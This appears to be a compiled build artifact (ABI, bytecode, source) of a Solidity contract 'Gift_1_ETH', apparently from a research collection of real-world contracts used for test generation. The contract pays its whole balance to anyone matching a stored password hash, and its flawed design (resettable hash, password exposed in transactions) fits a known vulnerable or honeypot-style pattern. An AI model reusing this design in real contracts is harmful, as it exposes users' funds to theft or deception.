{
  "contractName": "Gift_1_ETH",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548160ff021916908315150217905550341561002957600080fd5b61030f806100386000396000f30060606040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb051461006f578063181ffc5f1461008b57806331fd725a146100ae57806387f24484146100d5578063b456ecc514610106575b005b61008960048080356000191690602001909190505061017f565b005b6100ac600480803590602001908201803590602001919091929050506101b7565b005b34156100b957600080fd5b6100d3600480803560001916906020019091905050610241565b005b34156100e057600080fd5b6100e8610271565b60405180826000191660001916815260200191505060405180910390f35b341561011157600080fd5b610161600480803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091905050610277565b60405180826000191660001916815260200191505060405180910390f35b6000809054906101000a900460ff161580156101a35750670de0b6b3a76400003410155b156101b45780600181600019169055505b50565b81816040518083838082843782019150509250505060405180910390206000191660015460001916141561023d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050151561023c57600080fd5b5b5050565b600154600019168160001916141561026e5760016000806101000a81548160ff0219169083151502179055505b50565b60015481565b6000816040518082805190602001908083835b6020831015156102af578051825260208201915060208101905060208303925061028a565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090509190505600a165627a7a72305820fc3345f16bb4b85c8c3fe312a22ef681302ef3d9c5e15a8a63ae12e0449efaf20029",
  "source": "pragma solidity ^0.4.19;\n\ncontract Gift_1_ETH\n{\n    bool passHasBeenSet = false;\n\n    function()payable{}\n\n    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}\n\n    bytes32 public hashPass;\n\n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if(!passHasBeenSet&&(msg.value >= 1 ether))\n        {\n            hashPass = hash;\n        }\n    }\n\n    function GetGift(bytes pass)\n    external\n    payable\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}\n",
  "sourcePath": "/Users/stefan/Documents/PhD/SolMOSA/Smart Contracts/RWContracts/Smart-Contract-Modular-Template/Gift_1_ETH/contracts/Gift_1_ETH.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "3.0.19",
  "updatedAt": "2020-04-06T10:33:07.324Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}